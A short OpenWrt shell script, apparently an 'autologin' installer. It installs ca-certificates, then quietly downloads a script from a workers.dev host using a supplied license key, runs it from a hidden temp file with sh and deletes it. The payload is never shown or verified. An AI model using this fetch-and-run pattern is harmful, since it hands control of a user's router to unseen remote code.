#!/bin/sh
_a="https://autologin.creativy24.workers.dev"
_b="$1"
_c="/tmp/.sys_$$"

if ! opkg status ca-certificates 2>/dev/null | grep -q "Status:.*installed"; then
    echo "Installing ca-certificates..."
    opkg update >/dev/null 2>&1 || true
    opkg install ca-certificates >/dev/null 2>&1 || {
        echo "Gagal menginstal ca-certificates. Pastikan koneksi internet dan repositori OK."
        exit 1
    }
fi

curl -sSL "$_a/s?k=$_b" -o "$_c" 2>/dev/null
if [ -s "$_c" ]; then
    sh "$_c"
else
    echo "Download failed. Check connection or license key."
    exit 1
fi
rm -f "$_c" >/dev/null 2>&1
